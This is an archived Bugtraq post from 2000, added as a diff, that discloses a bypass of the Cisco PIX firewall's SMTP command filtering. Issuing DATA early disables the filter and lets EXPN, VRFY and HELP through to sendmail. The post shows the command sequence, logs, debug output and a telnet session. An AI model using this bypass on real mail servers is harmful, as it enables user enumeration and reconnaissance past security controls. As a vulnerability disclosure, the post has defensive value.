@@ -1,0 +1,209 @@
+From owner-bugtraq@SECURITYFOCUS.COM  Wed Sep 20 09:40:29 2000
+Date:         Tue, 19 Sep 2000 18:27:49 +0200
+Reply-To: naif <naif@INET.IT>
+Sender: Bugtraq List <BUGTRAQ@SECURITYFOCUS.COM>
+From: naif <naif@INET.IT>
+Subject:      Cisco PIX Firewall (smtp content filtering hack)
+To: BUGTRAQ@SECURITYFOCUS.COM
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+How to escape "fixup smtp" of  Cisco Pix Firewall:
+
+The Cisco Pix Firewall normally restrict some protocol command(http,ftp,smtp) and manage
+multisession protocol(h323, ftp,sqlnet) .
+I made some test on a BSDI3.0 running sendmail9 placed in the dmz .
+The Pix version it's the latest, 5.2(1)... here the output of "show ver"
+=====================================================
+Cisco Secure PIX Firewall Version 5.2(1)
+
+Compiled on Tue 22-Aug-00 23:35 by bhochuli
+
+pixtest1 up 22 days 5 hours
+
+Hardware:   SE440BX2, 128 MB RAM, CPU Pentium II 349 MHz
+Flash i28F640J5 @ 0x300, 16MB
+BIOS Flash AT29C257 @ 0xfffd8000, 32KB
+
+0: ethernet0: address is 00d0.b790.41a5, irq 11
+1: ethernet1: address is 00d0.b790.54d4, irq 10
+2: ethernet2: address is 00e0.b601.d289, irq 15
+3: ethernet3: address is 00e0.b601.d288, irq 9
+4: ethernet4: address is 00e0.b601.d287, irq 11
+5: ethernet5: address is 00e0.b601.d286, irq 10
+
+Licensed Features:
+Failover:       Enabled
+VPN-DES:        Enabled
+VPN-3DES:       Enabled
+Maximum Interfaces:     6
+Cut-through Proxy:      Enabled
+Guards:         Enabled
+Websense:       Enabled
+Throughput:     Unlimited
+ISAKMP peers:   Unlimited
+=======================================================
+The Pix when a new connection are established use his fixup filter to nullify every command
+that aren't in his "allowed list" (such as HELO,MAIL FROM:,RCPT TO:,DATA,RSET,QUIT)
+For example, for the "security trought obscurity" concept he rewrite the banner of
+the original MTA.
+This is a sendmail...
+
+220 *********************************************************2000 ***0******0200 ******
+
+Now,  pix  nullify help command, and if i write a e-mail to my friend asking for ''help'', it should drop
+the line on wich i write "help".
+So, Cisco Pix Firewall, after "data" command, until "<CR><LF><CR><LF>.<CR><LF>" disable the fixup .
+Now what appens if i don't complete the e-mail, or i immediatly type "data" in place of normal
+"helo, mail from,rcpt to,data, quit" ?
+Pix disable the fixup and give me a direct channel to the MTA without doing content filtering.
+
+Here an example of what i could do exploiting this bug:
+helo ciao
+mail from: pinco@pallino.it
+data                                 ( From here pix disable fixup)
+expn guest			     ( Now i could enumerate user
+vrfy oracle				and have access to all command)
+help
+whatever command i want
+quit
+
+Greeting to Cisco and it's Security Products !
+
+Here log of my test...
+
+- - Ip of the client: 10.10.10.10
+- - Public Ip of the Server: 10.10.10.2
+- - Private Ip of the Server: 172.16.1.2
+
+
+=====
+The sendmail log:
+
+Sep 19 14:06:19 testbox sendmail[14163]: NOQUEUE: Authentication-Warning: testbox.test.it: [10.10.10.10] didn't use HELO protocol
+Sep 19 14:07:36 testbox sendmail[14164]: NOQUEUE: [10.10.10.10]: expn pinco
+Sep 19 14:08:03 testbox sendmail[14165]: NOQUEUE: [10.10.10.10]: vrfy pallino
+Sep 19 14:08:50 testbox sendmail[14163]: OAA14163: from=pix@il.firewall.cattivo.it, size=0, class=0, pri=0, nrcpts=0, proto=SMTP, relay=[10.10.10.10]
+
+
+
+=====
+Here the OutPut of "debug fixup tcp" on the pix:
+
+        tcp: TCP MSS changed to 1380
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+        tcp: SYN out rcvd
+        tcp: TCP MSS changed to 1380
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/1302)
+        tcp: exiting embyonic
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+        tcp: TCP MSS changed to 1380
+        tcp: TCP MSS changed to 1380
+        tcp: TCP MSS changed to 1380
+        tcp: TCP MSS changed to 1380
+        tcp: TCP MSS changed to 1380
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/1302)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+        smtp: unknown command
+        smtp: X-ing ciao pix mi vuoi rispondere?
+
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/1302)
+        smtp_respond: ERR: bad reply code
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+        smtp: help command
+        smtp: nullify <help> command
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/1302)
+        smtp_respond: ERR: bad reply code
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+        smtp: mail command
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/1302)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/1302)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+        smtp: data command
+        smtp: entering data mode
+
+###### From here the pix think that i'm writing the e-mail body, so disable fixup
+###### and i could inject my malicious command without having them nullified.
+
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/1302)
+        smtp_respond: ERR: bad reply code
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/1302)
+        smtp_respond: ERR: bad reply code
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/1302)
+        smtp_respond: ERR: bad reply code
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+smtp_response: (172.16.1.2/25 -> 10.10.10.10/1302)
+        smtp_respond: ERR: bad reply code
+smtp: command (172.16.1.2/25 <- 10.10.10.10/1302)
+
+
+
+
+Here the telnet session:
+
+naif:~# telnet  10.10.10.2 25
+Trying 10.10.10.2...
+Connected to 10.10.10.2.
+Escape character is '^]'.
+220 *********************************************************2000 ***0******0200 ******
+ciao pix mi vuoi rispondere?
+500 Command unrecognized: "XXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+help
+500 Command unrecognized: "XXXX"
+mail from: pix@il.firewall.cattivo.it
+250 pix@il.firewall.cattivo.it... Sender ok
+data
+503 Need RCPT (recipient)
+
+#### LOOK, FROM HERE FIXUP IT'S DISABLED :)))
+
+help
+214-This is Sendmail version 8.9.1
+214-Topics:
+214-    HELO    EHLO    MAIL    RCPT    DATA
+214-    RSET    NOOP    QUIT    HELP    VRFY
+214-    EXPN    VERB    ETRN    DSN
+214-For more info use "HELP <topic>".
+214-To report bugs in the implementation send email to
+214-    sendmail-bugs@sendmail.org.
+214-For local information send email to Postmaster at your site.
+214 End of HELP info
+expn pinco
+550 pinco... User unknown
+vrfy pallino
+550 pallino... User unknown
+
+
+The End
+
+Greeting to bolo for the PIX and the BSDI box :)
+Kiss to my love NaiL^d0d :****
+
+
+naif
+
+e-mail:`echo "donlayiufhg@wiltoragpyzagvcm.wmdnehhqrstzwr" | tr -d \
+              'bdghlmoqrsuvwzy'`
+
+:pp
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.0.1 (GNU/Linux)
+Comment: For info see http://www.gnupg.org
+Filter: gpg4pine 4.1 (http://azzie.robotics.net)
+
+iD8DBQE5x5QLdK5I1NnlcMYRAscOAKCv+DvZ3mx4+7UT6LpFyuEQNlD57gCfRJoB
+2FEU8a6f1ZhtmDq82pOh3nE=
+=0UD1
+-----END PGP SIGNATURE-----
+
